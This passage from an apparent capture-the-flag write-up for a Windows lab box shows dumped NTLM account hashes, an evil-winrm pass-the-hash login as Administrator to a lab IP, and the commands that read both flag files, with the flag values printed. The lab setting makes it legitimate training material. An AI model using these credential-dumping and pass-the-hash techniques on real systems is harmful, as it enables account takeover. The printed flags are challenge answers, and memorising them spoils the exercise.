Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:39a21b273f0cfd3d1541695564b4511b:::
Jareth:1001:aad3b435b51404eeaad3b435b51404ee:5a6103a83d2a94be8fd17161dfd4555a:::
[*] Cleaning up... 
```

We got our admin hash, we can log in using it:

```ruby
evil-winrm -i 10.10.222.90 -u Administrator -H '6bc99ede9edcfecf9662fb0c0ddcfa7a'
```

![Pasted image 20250725143201.png](../../IMAGES/Pasted%20image%2020250725143201.png)

Time to get both flags and end the CTF:

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Jareth\Desktop\user.txt

THM{Y2I0NDJjODY2NTc2YmI2Y2U4M2IwZTBl}


*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\admin.txt

THM{YWFjZTM1MjFiZmRiODgyY2UwYzZlZWM2}
```

![Pasted image 20250725143205.png](../../IMAGES/Pasted%20image%2020250725143205.png)

